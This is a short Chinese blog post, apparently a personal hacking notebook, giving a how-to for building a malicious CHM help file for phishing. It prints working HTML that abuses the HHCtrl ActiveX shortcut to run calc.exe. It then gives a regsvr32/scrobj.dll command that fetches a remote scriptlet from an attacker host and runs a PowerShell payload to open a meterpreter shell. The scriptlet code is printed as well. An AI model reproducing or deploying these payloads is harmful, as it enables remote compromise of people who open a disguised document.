---
title: Chm fishing
date: 2019-01-27 11:50:03
tags: Writing
---
## 前言 ##
今天早上看到一个chm钓鱼的恶意事件，一时之间感觉蛮有趣。然后上google操作了一波发现不少这种操作。后面随手打开撸了一波，这里做个笔记
![58c5b28e07dc4395998e1d3a47f376f5.jpeg](http://5b0988e595225.cdn.sohucs.com/images/20181212/58c5b28e07dc4395998e1d3a47f376f5.jpeg)

资料来源：
[高级组合技打造“完美” 捆绑后门 - Evi1cg](https://wooyun.js.org/drops/%E9%AB%98%E7%BA%A7%E7%BB%84%E5%90%88%E6%8A%80%E6%89%93%E9%80%A0%E2%80%9C%E5%AE%8C%E7%BE%8E%E2%80%9D%20%E6%8D%86%E7%BB%91%E5%90%8E%E9%97%A8.html)

[CHM钓鱼 \| MottoIN](http://www.mottoin.com/tech/113429.html)
## 正文 ##
首先下载Easy CHM
![kucCzd.png](https://s2.ax1x.com/2019/01/27/kucCzd.png)

然后创建一个文件夹然后里面放一个html， 和几个文件夹
![kucmFS.png](https://s2.ax1x.com/2019/01/27/kucmFS.png)

calc弹弹弹测试，将以下html写入
```
<!DOCTYPE html><html><head><title>Mousejack replay</title><head></head><body>
command exec 
<OBJECT id=x classid="clsid:adb880a6-d8ff-11cf-9377-00aa003b7a11" width=1 height=1>
<PARAM name="Command" value="ShortCut">
 <PARAM name="Button" value="Bitmap::shortcut">
 <PARAM name="Item1" value=',calc.exe'>
 <PARAM name="Item2" value="273,1,1">
</OBJECT>
<SCRIPT>
x.Click();
</SCRIPT>
</body></html>
```
然后进行编译，在打开编译后的chm会发现能弹出一个calc
![kucJoT.png](https://s2.ax1x.com/2019/01/27/kucJoT.png)

![kuc8e0.md.png](https://s2.ax1x.com/2019/01/27/kuc8e0.md.png)

<b>meterpreter反弹测试</b>
是否会被杀软拦截：是
这里我使用venom生成payload
项目地址：[GitHub - r00t-3xp10it/venom: venom (metasploit) shellcode generator/compiler/listener](https://github.com/r00t-3xp10it/venom)
选择好powershell的选项的payload获取exp，然后在攻击机新建一个fanvcio.ico写入如下：

![kuc4OI.md.png](https://s2.ax1x.com/2019/01/27/kuc4OI.md.png)

```
<?XML version="1.0"?>
<scriptlet>
<registration
    progid="ShortJSRAT"
    classid="{10001111-0000-0000-0000-0000FEEDACDC}" >
    <!-- Learn from Casey Smith @subTee -->
    <script language="JScript">
        <![CDATA[
            ps1  = "你的exp";
            $shell=new ActiveXObject("WScript.Shell")
            $shell.Run(ps1,0,true);
           
 
        ]]>
</script>
</registration>
</scriptlet>
```
![kucWSH.md.png](https://s2.ax1x.com/2019/01/27/kucWSH.md.png)
然后在html写入如下
```
<!DOCTYPE html><html><head><title>Mousejack replay</title><head></head><body>
command exec 
<OBJECT id=x classid="clsid:adb880a6-d8ff-11cf-9377-00aa003b7a11" width=1 height=1>
<PARAM name="Command" value="ShortCut">
 <PARAM name="Button" value="Bitmap::shortcut">
 <PARAM name="Item1" value=',regsvr32.exe,/u /n /s /i:http://IP/favicon.ico scrobj.dll'>
 <PARAM name="Item2" value="273,1,1">
</OBJECT>
<SCRIPT>
x.Click();
</SCRIPT>
</body></html>
```
然后在用Easy CHM编译，在打开编译后的chm就能获取到一个meterpreter
![kucbtS.png](https://s2.ax1x.com/2019/01/27/kucbtS.png)

![kucvXn.png](https://s2.ax1x.com/2019/01/27/kucvXn.png)

转载请声明：转自422926799.github.io